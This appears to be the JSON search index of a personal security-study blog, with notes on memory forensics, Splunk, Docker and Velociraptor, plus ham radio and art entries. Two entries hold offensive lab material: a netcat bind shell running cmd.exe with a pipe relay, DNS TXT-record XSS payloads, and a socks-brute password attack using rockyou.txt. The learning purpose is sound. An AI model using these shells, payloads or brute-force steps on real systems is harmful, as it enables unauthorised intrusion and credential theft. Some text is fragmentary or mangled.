[
  
  {
    "title": "HAM Radio Notes",
    "url": "/posts/HAM-Radio-Baofeng-Notes/",
    "categories": "amateur radio, radio",
    "tags": "radio, ham radio, amateur radio, electronics",
    "date": "2025-03-17 12:55:00 +0000",
    





    
    "snippet": "Baofeng Menu ReferenceThis is documentation for how to use a Baofeng Radio. I am using a UV-5R8W. Many far more technical and qualified people have done extensive tutorials, so you should check the...",
    "content": "Baofeng Menu ReferenceThis is documentation for how to use a Baofeng Radio. I am using a UV-5R8W. Many far more technical and qualified people have done extensive tutorials, so you should check them out. But if you don’t have much of a radio background to begin with or just need a quick brush up, this should be the guide for you.You will need      One Baofeng Radio        Connecting Cables        CHIRP  CHIRPCHIRP is an open source python software for programming Baofengs and other radios with channels and other settings. The fields are as follows:FrequencyThis is the primary receive frequency that your radio is set to listen to.In a repeater setup, this would be the frequency the repeater transmits on (which is why you hear others talking on this frequency).NameCompletely self set, this could be anything you want but generally it should just be the name of the stationTone ModeHow the radio handles squelch tones, such as CTCSS or DCShttps://forums.radioreference.com/threads/tone-settings-in-chirp.331278/  “For general information though, the “Tone Mode” chosen determines which of the columns are going to be written to the radio.”Notice you can pick [Blank], Tone, TSQL, DTCS, and CrossBlankNo tone is being used, radio will transmit without sending a CTCSS or DCS tone. Your radio will receive all transmissions on that frequency even if they have a tone or squelch setting. If a repeater requires a tone to activate, your transmission will not trigger it unless you set the correct tone mode.When to Leave Tone Mode Blank?  If you’re using a simplex frequency (direct radio-to-radio communication).  If you’re listening to a frequency that doesn’t use a tone-based squelch.  If you’re scanning a frequency and want to hear everything, including signals without tones.When NOT to Leave It Blank?  If you’re using a repeater that requires a CTCSS/DCS tone.  If you’re getting no response from a repeater (it may require a tone).  If you want to filter out unwanted transmissions.ToneTone: radio sends a CTCSS tone when transmitting, but does not require a tone to receiveTSQLDTCSToneTone SquelchDTCSRX DTCSDTCS PolarityCross ModeDuplexOffset/TX FreqModeSkipPower"
  },
  
  {
    "title": "Namespace Notes",
    "url": "/posts/namespace-notes/",
    "categories": "tech",
    "tags": "scrapbook, notes, volumes",
    "date": "2024-08-14 12:55:00 +0000",
    





    
    "snippet": "Small Book 1Formal Titles:Threat DetectionForensicsEnterprise SecuritySecurity EngineeringWeb Aoo Pentesting/Bug BountiesEmail ResearchRadio/WiFiSCADASatellites/DeepspaceREGEX(\\S)(M) --&gt; Grabs a...",
    "content": "Small Book 1Formal Titles:Threat DetectionForensicsEnterprise SecuritySecurity EngineeringWeb Aoo Pentesting/Bug BountiesEmail ResearchRadio/WiFiSCADASatellites/DeepspaceREGEX(\\S)(M) --&gt; Grabs all nonwhite character spaces that occur right before the character M:999999/s2test}\" \"Mozilla/5.0 (Windows NT 10.0\", ....(K HTML, live Gecko)...--&gt; \"M(\\S)(HTTP)(\\s)Hypertext Transfer Protocol HTTP/1.1Splunk Regex (rex)            rex field=System_Props_Xml      That vanilla regex command up there could probably correspond with            (\\S      \\s)  (?&lt;  extracted  &gt;\\SM)”      –&gt; (\\S|\\s) at the front is Match and Exclude–&gt; “ at the end is Match and Exclude—-&gt; NOTE: that stuff inside the paranthesis is for match and INCLUDEThe Post-It PartsIncident Response“… malfind, injectrd code”… the header of a Windows exe will always start with “4D 5A” -&gt; MZ in ASCII decoded textOffset(h) 00 01 02 03 04 05...0000 0000 4D 5A 90 00 03 000000 0110 ...Any of these values in a process will amount to malware injectionThis indeed turned up for reader_s1.exeMZ...... yy... ..* ..... This program cannot be read in DOS ModeXSS StuffPayload gets delivered via a network packetPart 1&lt;script&gt;alert('XSS!')&lt;/script&gt;Part 2/etc/bind/zones/....dbPart 3Actually create a file to upload xss into a dns record Mysterious Pink Post-ItMicrosoft: How to make an autorun-enabled applicationVelociraptor: Open Source Colgithub rsmudge/Malleable     C2 Profiles crimewave/zeus.profilea_rey/google\\_RATapp.letsdefend.io    reverse engineeringcrypt0ace.github.io/posts/DLL-SideloadingWhat is TCP/IP?TCP: Manages how a message gets broken down. Addresses transmittedIP: How is it Routed?ReliabilityClient --&gt; Sends SYNHost --&gt; Sends SYN ACKClient --&gt; Sends ACKTLS: Security layer on top of TCP/IP to establish Any layers on top like TLS establishes encryption algorithmsPowershell StuffInvoke-Item [file]open the fileGet-Item -Path C:\\folder\\or\\file\\path(Get-Item -Path C:\\folder\\or\\file\\path).LastWriteTimedir * | select name,LastWriteTime,CreationTime,LastAccessTime(from NeemoBeer)https://windowsforum.com/threads/how-to-get-folder-properties-in-the-command-line-similar-to-wmic-datafile-for-files.263352/A4D 5Apython vol.py -f infected.vmem [windows.psscan]    (lists a list of PID’s and PPID’s)3968  2732  @WanaDecrypt2732  1456  or4qtckT.exepython vol.py -f infected.vmem [windows.pstree]    * or4qtckT.exe   0x83ed43    * @WanaDecryptor 0x83ed680python vol.py -f infected.vmem windows.handles –pid 2732    2732 or4qtckT.exe FILE\"...handles are unsigned integers used to keep track of objects in memory. It is a pointer to some type of memory location\".**svchost should always have a -k flag after. ** this -k flag specifies the group name which svchost needs to startProcessScanpython.exeCondensed Spellbook - 3.1 Netcat Linux RelayStart with 2 machinesMachine #1: Windows (10.10.0.1)Machine #2: Linux (10.10.75.1)  Start up a listening shell on Machine #1** nc -l -p 54321 -e cmd.exeThe -e means it will execute a shell once it received a connection on that port  On Machine #2 create a named pipe and start a relay to interact with it** mknod backpipe p** nc -l -p 11111 0&lt;backpipe | nc 10.10.0.1 54321 1&gt;backpipeThis step was kind of tricky to me, no one really explained to me exactly what a backpipe is            “In the context of the command nc -l -p 11111 0&lt;backpipe      nc 10.10.0.1 54321 1&gt;backpipe, a named pipe (backpipe) is being utilized to establish a relay between two instances of the nc (Netcat) command.      nc -l -p 11111 0&lt;backpipe: This command initiates a listening mode (-l) on port 11111 using Netcat (nc). The 0&lt;backpipe part reads input from the named pipe (backpipe). This means that any data written into backpipe will be sent out through the listening Netcat process on port 11111.The 1&gt;backpipe part writes output to the named pipe (backpipe)This means that any data received from the remote server at 10.10.0.1:54321 will be written into backpipe,nc 10.10.0.1 54321 1&gt;backpipe: This command establishes a connection to the specified IP address (10.10.0.1) and port (54321) using Netcat. The 1&gt;backpipe part writes output to the named pipe (backpipe). This means that any data received from the remote server at 10.10.0.1:54321 will be written into backpipe, which will then be read by the listening Netcat process established in the first part of the command.”According to the AI Overlords,“…The command mknod is used to create special files in Unix-like operating systems. In this context, mknod is being used to create a named pipe, which is a special type of file that allows interprocess communication (IPC) between processes.”“…Here’s what each part of the command mknod backpipe p means:mknod: This is the command itself used to create special files.backpipe: This is the name given to the named pipe. You can choose any name you want for the named pipe.p: This specifies that we are creating a named pipe. In Unix-like systems, p is the type for a named pipe.“”In Unix-like operating systems, there are primarily two types of pipes: unnamed pipes (also known as anonymous pipes) and named pipes (also known as FIFOs - First In, First Out).Unnamed Pipes (Anonymous Pipes):Unnamed pipes are created using the pipe system call.They exist within the kernel’s memory and are used for communication between parent and child processes or between related processes created by a common ancestor.Unnamed pipes are typically used for simple, one-way communication between processes.They have no persistent representation on the file system and are automatically closed when the processes using them terminate.Named Pipes (FIFOs):Named pipes are created using the mkfifo command or the mknod command with the type p.They are represented as special files in the file system and have a persistent existence, allowing unrelated processes to communicate with each other.Named pipes are similar to unnamed pipes but can be accessed by any process with appropriate permissions.They provide bidirectional communication and can be used for more complex inter-process communication scenarios.These pipes serve as a mechanism for IPC (Inter-Process Communication) in Unix-like systems, allowing processes to exchange data with each other efficiently.””  On Machine #2, open a new terminal** nc 127.0.0.1 11111 +------------------+                    +------------------+ |     Machine #1   |                    |     Machine #2   | |    (Windows)     |                    |     (Linux)      | +------------------+                    +------------------+         |                                     |         |                                     |         |                                     |      +--+------------------+          +------+------------------+      |  Start listening   |          |  Create named pipe  |      |  shell on port    |          |  and start relay    |      |  54321, execute   |          |  on port 11111     |      |  cmd.exe          |          |                    |      +-------------------+          +--------------------+                |                              |                |                              |                |                              |      +---------+---------+            +-------+--------------+      |  Data transmitted  |            |  Data received and  |      |  over TCP to port  |            |  forwarded to TCP   |      |  54321             |            |  port 54321         |      +--------------------+            +---------------------+Condensed Spellbook - 4.2 XSS ScriptingSpell showcases reflected XSS attack on a DNS Record. First off, the user goes to a dns-lookup tool[example.com]/dnslookup –&gt; showing TXT Records.When you register a DNS Record, you can include lots of fields such as DKIM but also TXT Records. The lab claims that this can contain javascript and thus execute/etc/bind/zones1. Vanilla XSSOpens up a vulnerable web app and enters just a regular old XSS Injection in…. an input box&lt;script&gt; alert(‘XSS 1!’) &lt;/script&gt;”2. Edit the DNS Record and Seevim /etc/bind/zones/[redacted]info.db(Bind DNS)example.com.  IN TXT “&lt;script&gt; alert(‘XSS 2!’) &lt;/script&gt;”Now if the user is doing this DNS lookup, the site will actually execute the javascript3. Load+Execute an external JS FileWe are repeating step 2 but rather than just having a typical (Bind DNS)example.com.  IN TXT “”Keep in mind the A and MX records as well.Credit goes where credit goesJamie Hankins, Erick Setiawan, Jonathan Davis, Devin WaltersIncident ResponseVaronis Set1/3“Can we capture the memory? (aka RAM)”Malware can hide but it must run  pstree: what process launched another? This will sniff out the fake svchost.exe. Windows prcesses always run from set locations. Our task is to look for Weird Locations and Weird Parent Processesex. taskhostw –&gt; %systemroot%\\system32\\taskhost.exeThe parent process for taskhostwis always svchost.exemaybe windows.malfind2/3Identifying Injected Code“Break past obfuscation”the malware must unpack itself!  In order to unpack itself, the malware has to create a child process  Inject the unpacked exe into a new processwindows.malfind – hex permissions, headersPID * ProcessName * Protection *“Page_EXECUTE_READWRITE”Process has execute, read and write permissions executable headersHow to find….3/3“… the header of a Windows exe will ALWAYS start with 4D 5A aka MZ in ASCII”Hex codeOffset (h) 00 00 0z 03 04 05…000000000       4D 5A 90 00 03 00 000000Decoded TextAny of these values in a proces == malware injectionThis indeed turned up for reader_s1.exeMZ……. yy.. ….*…..This process cannot be run in DOS ModeVolatility Walkthroughpython vol.py cridex.vmem windows.cmdlinePID     Process     Args664    lsass.exe    C:\\Windows\\system32\\lsass.exe824    svchost.exe  svchost -k DcomLaunch998    svchost.exe  svchost -k rpcss1056   svchost.exe  svchost -k Network Servicesvc should always have -k, which “specifies the group policy”8560  svchost.exe  C:\\Windows\\svchost.exe“no -k for any legit svchost.exe”vol.py -f “cridex.vmem” -o . windows.memmap –dump –pid 1640Python Stuffpython -m SimpleHTTP ServerScripting StuffPowershellfindstr “apple” “C:\\notes.txt” ls | Sort-Object LastAccessTimestuffnetstat -naob 5–&gt; gets the executable name and the DLL’s loaded for the network connectionUnusual accounts in the admin grouplsusr.mscevent log service was stoppedMSTelnet Service has startedWindows File Protection is not activeMusing      Do you feel that your role lets you be flexible in your analysis?        Do you have plans ot overhaul the analysis process?        How long do these incident cases typically remain open?        What type of threat actor is your primary concern?        Who are your main adversaries?        What is the typical career progression for people in this team?        Whats the percentage of time spent on projects vs actioning items?        Can you describe the typical threats or challenges this team deals with? And what strategies are in place to detect and respond?  Some ProjectsMicrosoft: how to make an autorun-enabled applicationVelociraptor open source Colgithub.rsmudge/Malleable C2 profiles crimeware /zeus.profilea_rey/google_RATapp.letsdefend.io reverse engineeringcryt0ace.github.io/posts/DLL-SideloadingSANS Windows Intrusion DiscoveryUnusual Files and Registry Keysdir c:\\HKLM &amp; HKCU Software\\Microsoft\\Windows\\CurrentVersion\\RunSoftware\\Microsoft\\Windows\\CurrentVersion\\RunOnceSoftware\\Microsoft\\Windows\\CurrentVersion\\RunOnceExRegistry Editorregedit –&gt; reg query --&gt;registry editorFile Sharenet view \\127.0.0.1Open SMB Sessionsnet sessionUnusual  Process/Services  Files/Registry Keys  Weird Network use  Scheduled Tasks  Unusual Accounts  Log EntriesProcesses/ServicesTask Manager  tasklistwmic process list fullservices.mscnet start(list running network services)net usesmb sessions this machine has opened on other systemsWhat is TCP/IP?TCPManages how a message gets broken down. Address Transmitted!IPHow is it routed?The focus is on reliabilityClient: SYNHost:  Sends SYN-ACKClient: Sends ACKTLS: Security layer on top of the TCP/IP Any layers on top like TLS establishes encryption algorithmsViruses vs Worms vs Malware  Malware encompasses all of these and spyware, ransomware, and worms.  Worms self replicate and viruses must be sent from one computer to another via user or software.What is a Hypervisor?A program for running one or more virtual machines on a computer.Creates and runs VM’s (virtual machines)“…containers are lightweight because they do not require an extra load of a hypervisor. They run directly within the host machine’s kernel.”"
  },
  
  {
    "title": "Active Directory",
    "url": "/posts/active-directory/",
    "categories": "tech",
    "tags": "tech, ctf, red team, pentesting",
    "date": "2024-03-02 12:55:00 +0000",
    





    
    "snippet": "Forests, Trees, and Domains[Screenshot of AD]  Active Directory’s Logical Divisions  Domains: Group of network objects (ex.) with the same Active Directory database  Tree: a group of domains stemmi...",
    "content": "Forests, Trees, and Domains[Screenshot of AD]  Active Directory’s Logical Divisions  Domains: Group of network objects (ex.) with the same Active Directory database  Tree: a group of domains stemming from those root domains.  Forest: A whole bunch of these root domainsSetup DNS on Active Directoryhttps://www.youtube.com/watch?v=-TsqAHUWdQU&amp;ab_channel=MSFTWebCast"
  },
  
  {
    "title": "Splunk",
    "url": "/posts/splunk/",
    "categories": "tech",
    "tags": "tech, ctf, red team, pentesting",
    "date": "2024-02-14 12:55:00 +0000",
    





    
    "snippet": "                    rex field = System_Props_XML (\\S)(HTTP)(\\s)                                (\\S        \\s) (?\\SM)\"            ",
    "content": "                    rex field = System_Props_XML (\\S)(HTTP)(\\s)                                (\\S        \\s) (?\\SM)\"            "
  },
  
  {
    "title": "Base CTF Recipe",
    "url": "/posts/ctfs/",
    "categories": "tech",
    "tags": "tech, ctf, red team, pentesting",
    "date": "2024-02-14 12:55:00 +0000",
    





    
    "snippet": "duffle bag for pen testRaw NotesRaw Notes 1Reconnmap scan reveals two open ports            Port      Status      Info                  80      open      http (web application)              1080   ...",
    "content": "duffle bag for pen testRaw NotesRaw Notes 1Reconnmap scan reveals two open ports            Port      Status      Info                  80      open      http (web application)              1080      open      socks (socks5 proxy requiring authentication)        nikto -h [ip address]reveals more about the web application such as the version  dirbuster [web application] need to use the seclist /big.txt–&gt; webapp.local/adminpanel –&gt; webapp.local/config.txtthis config.txt reveals username: prime                        password: temppassword  curl -x socks5://Prime:temppassword@[ipaddress]:1080/ http://[webapp.local]  echo “Prime” &gt; “user.txt”nmapAttempt nmap-scripts bruteforce when this curl temporary password doesn’t work  nmap –script socks-brute –sript-args userdb=./user.txt, passdb=/usr/share/seclists/Passwords/LeakedDictionaries/rockyou.txt -p 1080 [ipaddress] -v–&gt; port         State     Service    1080/tcp     open      Socks| socks-brute         accounts:                Prime:tinkerbell1curl again  curl -x socks5://Prime:tinkerbell1@[ipaddress]:1080/ http://[webapp.local]"
  },
  
  {
    "title": "Docker Cheatsheet",
    "url": "/posts/docker/",
    "categories": "tech",
    "tags": "docker",
    "date": "2024-02-12 12:55:00 +0000",
    





    
    "snippet": "Raw NotesRaw Notes 1Raw Notes 2Raw Notes 3Raw Notes 4Tutorials Usedhttps://github.com/weslambert/velociraptor-dockerIroncailly this had nothing to do with docker initiallySetupEnsure docker-compose...",
    "content": "Raw NotesRaw Notes 1Raw Notes 2Raw Notes 3Raw Notes 4Tutorials Usedhttps://github.com/weslambert/velociraptor-dockerIroncailly this had nothing to do with docker initiallySetupEnsure docker-compose is installed on the hostgit clone https://github.com/weslambert/velociraptor-dockercd velociraptor-dockerChange credential values in .env as desiredCommands** docker-compose up (or docker-compose up -d for detached) **Access the Velociraptor GUI via https://:8889Default u/p is admin/adminThis can be changed by running:docker exec -it velociraptor ./velociraptor –config server.config.yaml user add user1 user1 –role administratorNotes:Linux, Mac, and Windows binaries are located in /velociraptor/clients, which should be mapped to the host in the ./velociraptor directory if using docker-compose. There should also be versions of each automatically repacked based on the server configuration.Once started, edit server.config.yaml in /velociraptor, then run docker-compose down/up for the server to reflect the changesDocker imageTo pull only the Docker image:docker pull wlambert/velociraptorTo pull a specific version of the Docker image:docker pull wlambert/velociraptor:0.6.8-2"
  },
  
  {
    "title": "MemProcFS (Part 1)",
    "url": "/posts/memprocfs-part-1/",
    "categories": "tech",
    "tags": "forensics, memprocfs, annotations, 13cubed",
    "date": "2023-09-28 03:33:00 +0000",
    





    
    "snippet": "Annotations and quick copy-pastes for MemprocFS, based on 13Cubed’s tutorial. I don’t see a whole lot of other people using this tool but it has been useful so I guess here we are.TLDR SpeedRunComm...",
    "content": "Annotations and quick copy-pastes for MemprocFS, based on 13Cubed’s tutorial. I don’t see a whole lot of other people using this tool but it has been useful so I guess here we are.TLDR SpeedRunCommands&gt; MemProcFS.exe -device memdump.vmem -forensic 1/sys/proc- pstree output/sys/net- netstat output/registry/HKLM/SYSTEM/ControlSet001/Control/ComputerName /registry/HKLM/Software/Microsoft/Windows/Current Version/Run/registry/hive_files- list of the PIDs by name (dash the actual PID#)/name/(randomprocess)/name/(randomprocess)/files/handles     - what files was this process interacting with /name/(randomprocess)/files/modules    - what dlls was this process interacting with/name/(randomprocess)/files/vads    - how Windows keeps track of what process memory is allocated to a process/pidRaw Notes 1Raw Notes 2Raw Notes 3Part 0: AKA InstallationThis was the trickiest part IMO especially if you are some casual like me who has NO IDEA what forensics tools are like.You will need an infected .vmem file, such as the cridex one in Volatility’s.You will need to  download MemProcFS off of their site along with installing Dokany .msi if you’re doing this on a Windows hostFor me, I did this all on a Windows host.Installing DokanyDownload the .zip off of the github releases AND the Dokany msiUnzip the file and then run the .exe from commandline/terminal/powershell  “…equating to the directories and files related to the MemProcFS forensic sub-system. The forensic sub-system is a collection of more thorough batch-oriented analysis tasks that may be undertaken on memory dumps.”https://github.com/ufrisk/MemProcFS/wiki/FS_Forensic  Take Note: that .vmem file is that same cridex.vmem sample we used with Volatility.Part 1: Running MemProcRunning Memproc.\\MemProcFS.exe -device '[.VMEM SAMPLE]' -forensic 1  -forensic Starts a forensic scan of the physical memory  -device [the .vmem image to examine]  MemProc will take a bit for the /forensics folder to show up but it will contain info regarding things like timelines of processes and dlls loaded.When you run this it will seem like nothing is happening, and you can for now ignore the python warning. But if you look at your Windows directory, you will see the :\\M image loaded for you to browse through like a file directory.Using the .vmem John Hammond used in his walkthrough:M\\ directory appearingThe image getting mountedPart 2: Running Through5:30 is the approximate timestamp for when this starts.Relevant directories:/sys/registry/name/pidfolder directory\\sys\\ Folder\\sys\\procProcess hierarchy, textfile roughtly corresponding to a pstree output in Volatilitynote: explorer should not be the parent process for svchost.exeexamining proc\\sys\\netNetstat output/netscan in volatilityfolder directory\\registry\\ FolderSimilar to regeditfolder directory\\registry...\\Run\\RunOnceThe Run/RunOnce registry keys make the program run once the user logs infolder directoryM:\\registry\\HKLM\\Software\\Microsoft\\Windows\\Current Version\\Runfolder directorylist of the PID's by name (dash the actual PID #)&gt; Registry Hives: logical group of keys, subkeys, and values in the registry. Each time a new user logs on, a new hive gets created for that user with a separate file for the user{: .prompt-tip } ### \\name\\ Folder ![Desktop View](/assets/img/tutorials/memprocfs-part1/memprocfs tutorial10.png){: width=\"972\" height=\"589\" }_folder directory_/files/handles will tell you the files this process was interacting with /files/modules will tell you all the dlls with which the process was interacting/files/vads (virtual address descriptor) is how windows keeps track with what process memory is allocated to a process ![Desktop View](/assets/img/tutorials/memprocfs-part1/memprocfs tutorial11.png){: width=\"972\" height=\"589\" }_handles_![Desktop View](/assets/img/tutorials/memprocfs-part1/memprocfs tutorial14.png){: width=\"972\" height=\"589\" }_folder directory_## Part 3: M:/forensic Folder![Desktop View](/assets/img/tutorials/memprocfs-part1/memprocfs tutorial15.png){: width=\"972\" height=\"589\" }_folder directory_Forensic &gt; Timeline is a list of processes in memory.```consoleM:\\forensic\\timeline\\timeline_registryM:\\forensic\\timeline\\timeline_netRegistry paths and timestamps associated with themforensic\\findevilRemember, this forensic folder may or may not be"
  },
  
  {
    "title": "Volatilty",
    "url": "/posts/volatility-part-1/",
    "categories": "tech",
    "tags": "tech, volatility forensics, plague doctor",
    "date": "2023-09-26 12:55:00 +0000",
    





    
    "snippet": "Annotations of various tutorials on starting out in Volatility, a python-based tool for Host-Based Forensics and Incident Responders. This tool is for digital investigation, and requires the reposi...",
    "content": "Annotations of various tutorials on starting out in Volatility, a python-based tool for Host-Based Forensics and Incident Responders. This tool is for digital investigation, and requires the repository up on Github and a .vmem file for collection.sRaw NotesRaw Notes 1Raw Notes 2Raw Notes 3Raw Notes 4Tutorials Used            Tutorial      Author      Comments                  Memory Forensics Using the Volatility Framework      Professor K      the most straightforward video              VOLATILITY 3 CHEATSHEET      Ashley Pearson      Volatility 2 vs 3 differences              (EASIEST) Install Volatility on Windows (Standalone)      Computer Science Basics      Skip to 0:45 seconds              How to Use Volatility for Memory Forensics and Analysis      Neil Fox      Goes a bit more in depth on malfind and code injection              Rapid Windows Memory Analysis with Volatility 3      John Hammond      Going a bit further (needs BTLO)      These are the resources in order that I used to get more familiar with the tool. They’re all pretty straightforward, and unlike MemProcFS, it required minimal setupIngredients  Python 3 (to run the vol.py script)  Volatility 3 (use the .zip file in the github repo)  .vmem Cadaver0. InstallationUsing Volatility 3, download the .zip file from their Github RepoGithub Repo &gt; Releases &gt; Source Code (.zip)cd into the repository and runpip3 install -r requirements.txtvol.py -f &lt;.VMEM SAMPLE&gt; windows.info1. Quick Command Toolboxvol.py -f &lt;.vmem sample&gt; &lt;module&gt;Note: I used the cridex.vmem example that Professor K showcased in his tutorialNote: I used python 3python vol.py -f cridex.vmem windows.infopython vol.py -f cridex.vmem windows.pslistpython vol.py -f cridex.vmem windows.pstreepython vol.py -f cridex.vmem windows.psscanpython vol.py -f cridex.vmem windows.netscanpython vol.py -f cridex.vmem socketspython vol.py -f cridex.vmem -o . window.dumpfiles --pid 1640 (this gets the exe and associated dlls)python vol.py -cridex.vmem -o . windows.memmap --dump --pid 1640strings 1640.dmp | grep -Fi \"weird thing, etc\" -C 5python vol.py -f cridex.vmem windows.malfind 2. AnnotationsHighly recommend that you actually watch these videos or read through them, these are more of a quick memory jog and so while they make sense to me since I’ve watched them, they’re probably not as insightful as at least giving the video a watch.Professor K Probably the most straightforward out of all the tutorials, he just dives right into it. Keep in mind that he uses a Linux host to examine a .vmem image of an infected Windows machine. He is also using Volatility 2. I didn’t have much trouble getting past this on a Windows workstation using Volatility 3 and Python 3, but you may need to pull up Ashley Pearson’s Volatility 2-3 cheatsheet.Timestamps1:08 - Cridex Sample ( I already downloaded this and put it in my volatility folder for ease of access)1:52 - Extract to memdump (user created)2:45 - Runs volatility as a command, but I just did python vol.py3:03 - volatility 3-2.4.1\\vol.py -f cridex_memdump\\cridex.vmem image.info----&gt; -f: use the following file (cridex.vmem) image.info----&gt; image.info is a basic Volatility module----&gt; vol.py -f cridex.vmem windows.info----&gt; this module gives basic system info, like when it was taken,  mount system 3:46 - vol.py -f cridex.vmem windows.info4:15 - vol.py -f cridex.vmem --profile=WinXPSP2x86 pslist----&gt; vol.py -f cridex.vmem windows.pslist, be aware of any that catch your attention4:45 - All the processes running on this machine5:12 - Takes note of explorer.exe &amp; an unknown reader_s1.exe5:40 - volatility -f cridex.vmem --profile=WinXPSP2x86 pstree----&gt; pip3 install -r .\\requirements.txt -vv5:46 vol.py -f cridex.vmem windows.pstree ----&gt; take note of explorer.exe to reader_s1.exe6:08 View processes currently trying to hide----&gt; vol.py -f cridex.vmem profia vle = Win... psxview----&gt; there's not quite a volatility equivalent , but just gets lumped with pstree and pslist----&gt; vol.py -f .vmem windows.psscan6:20 - The 1st two columns, the pslist &amp; psscan. If any of these register as fake----&gt; If an entry is found in psscan but not psslist, it is attempting to hide6:50 - Check for any sockets or open connections ( in 3 steps) ----&gt; vol.py -f cridex.vmem connscan (windows.netscan)----&gt; vol.py -f cridex.vmem sockets (\"All the sockets currently running + PID\")----&gt; Communication link between 2 programs7:26 - All the sockets currently running + PID8:09 - netscan8:20 - Three Other Pluginsvol.py -f cridex.vmem  cmdline --&gt; windows.cmdline.Cmdline8:36 - We know from our original pstree that PID 1484=suspicious ---&gt; path: C:\\Program Files \\Adobe\\Reader 9.0\\Reader\\Reader_S1.exe9:10 - cmdline should give us a complete path for how these two programs are actually run9:21 - Dump the memory area that runs this executable---&gt; volatility -f cridex.vmem --profile=WinXPSP2x86 procdump -p 164010:01 - In his video, he gave a dumpfile of 1640, the file was very dlls named this10:10 - Addressable memory being used by the executable vol.py -f cridex.vmem -o . windows.memmap --dump --pid 164010:40 - Look closer at the memory of what was going on inside of this reader.exe10:50 - strings 1640.dmp | grep -FI \"41.168.5.140\" -c 5compare this with thirteen cubed, which had vol.py -f cridex.vmem windows.pslist | grep i ()vol.py -f cridex.vmem windows.pslist --pidvol.py -f cridex.vmem windows.cmdline --pid 148411:25 - Here in the .dmp strings we can see communication with this IP Address using a POST, potentially exfiltrating info.12:17 - We could sscroll through the entire dmp file, in the video he found various banking urls12:40 - we could possibly reverse engineer it or upload the .dmp to VirusTotal13:45 - What is launching this malware? Dive into the registry14:12 - Most malware will look to see if infected files are still present at system startup + communicate with that .exe every few minutes14:25 - If that .exe has been removed, the payload will rebuild the executable but with a different name. Need to find the payload 15:18 - volatility -f cridex.vmem hivelist15:27 - What is hiding in one of the keys? Running as an exe at start16:55 - See my association with this exe and 1640 weird process17:20 - strings 1640.dmp | grep -Fi \"Kb000207877.exe\"Varonis Please check out the original tutorial, it’s one of the few non video formats and goes more into malfind in the Identifying Injected Code part  “…This displays a list of processes that Volatility suspects may contain injected code based on the header information displayed in hex, the permissions, and some extracted assembly code, just because a process is listed in the output it doesn’t mean the process is 100% malware.”Identify Malicious Network Connectionspython vol.py -f &lt;&gt; windows.netscanIdentify Injected Code  Things Volatility only suspects to be injected codewe’re looking for PAGE_EXECUTE_ReadWrite permissionsHeader of a Windows Executable is MZOR 4D 5Apython vol.py -f cridex.vmem windows.malfind Procdumpextracts exe and all dlls associatedpython vol.py -f &lt;&gt; -o &lt;location&gt; windows.dumpfiles --pid []Identify Malicious Processespslist pstree - for spotting malicious processes masquerading as valid ones.  “… Windows processes always run from set locations on disk. The parent process is usually a set process.”-k: specifies a group of services to run"
  },
  
  {
    "title": "How To Use This Site",
    "url": "/posts/how-to-use-this-site/",
    "categories": "intro",
    "tags": "writing, intro, tech, documentation",
    "date": "2023-09-23 06:10:00 +0000",
    





    
    "snippet": "A Repo for Cluttered Minds. Use each card as a review topic for notebooks.Topics Covered---Threat HuntingForensicsCloudActive DirectoryAppsec StuffRadioOther Projects---Threat HuntingWhat SOC work ...",
    "content": "A Repo for Cluttered Minds. Use each card as a review topic for notebooks.Topics Covered---Threat HuntingForensicsCloudActive DirectoryAppsec StuffRadioOther Projects---Threat HuntingWhat SOC work eventually lead to. Detect, investigate, and mitigate. Learn to try and establish a motive to guess the target and where they might have gone. There is a reason your job has not been automated.Stack: Splunk, Regex, Wireshark, EDR, Threat DetectionForensicsThe computer kind, or the investigation of system activity on digital devices to uncover evidence of a crime. I put Incident Response in this category, the whole Chain of Custody process, etc. The goal is to build up a narrative of what happened, like an actual crime scene.Stack: Host-based Logs, EDR, MemprocFS, Volatility, Redline, Disk Forensics, Memory Forensics,Active DirectoryHomelabs galore, authentication, authorization, lots of Kerberos ticketing to test out the Threat Detection part. Think of this like a firing range.Stack: Microsoft Active Directory, Kerberos, HyperVAppsec StuffHonestly, a general umbrella term for software related projects, mainly playing around with API’sCloudCode For San Jose / Open Source San Jose stuffRadioOther Projects  Want to learn coffee stuff?  If you’re looking for my art portfolio, that would be technomancer-01.comI think this jekyll setup is much better suited towards documentation, although I am already seeing that it loads images better so I may use it for art as well. One big component for me is the Tome Fragment aspect of them, how we’re going to treat things as if they are actual historical documents to be analyzed.Projects: On the Nature of Tarnished Souls, Bloodborne in Wonderland, Coruscant Library, DnD, Tales From the Leyline Road, Delta Green, m4ven.OS, and Medicine Bun.---Memprocfs: Small NASA Booklet. Confirmed to workVolatility: 13 cubed version, Professor K versionEmail Header Analysis:  Small NASA Booklet.Prefetch files on Windows: Small NASA BookletCaesar Cipher: Under Basic Cantrips sectionPrice Calculator: Under Basic Cantrips sectionVolatility (John Hammond): Just timestamps---This site uses the Gitpage + Jekyll stack with the Chirpy theme."
  },
  
  {
    "title": "On The Nature of Tarnished Souls",
    "url": "/posts/Elden-Ring/",
    "categories": "art",
    "tags": "art, elden ring, soulsborne, fromsoftware, arcane ink",
    "date": "2023-09-15 12:55:00 +0000",
    





    
    "snippet": "On The Nature of Tarnished SoulsYou may have come here from my art site. This is a documentation as well of the pages of this tomeEileen The CrowPagesShop",
    "content": "On The Nature of Tarnished SoulsYou may have come here from my art site. This is a documentation as well of the pages of this tomeEileen The CrowPagesShop"
  },
  
  {
    "title": "Bloodborne in Wonderland",
    "url": "/posts/Bloodborne/",
    "categories": "art",
    "tags": "art, bloodborne, arcane ink, fromsoftware, sketch, sketchbook, soulsborne",
    "date": "2023-08-10 16:34:00 +0000",
    





    
    "snippet": "“Good Hunter, lost in the nightmare. What do you think of that beastly legend and those ailing wards of the church?… I know what you did to them… It’s not y our fault. The nightmare held them, and ...",
    "content": "“Good Hunter, lost in the nightmare. What do you think of that beastly legend and those ailing wards of the church?… I know what you did to them… It’s not y our fault. The nightmare held them, and now they are free. But what about you? Have you profited at all?”Why Bloodborne?Download &amp; Replace"
  },
  
  {
    "title": "EDR Velociraptor",
    "url": "/posts/EDR-Velociraptor/",
    "categories": "tech",
    "tags": "tech, ctf, red team, pentesting",
    "date": "2022-02-27 12:55:00 +0000",
    





    
    "snippet": "Video Demohttps://www.youtube.com/watch?v=2kgC9Ushk9g&amp;ab_channel=TaylorWaltonVelociraptor Release Linkhttps://github.com/velocidex/velociraptor/releases/Surprisingly Simple Documentationhttps:/...",
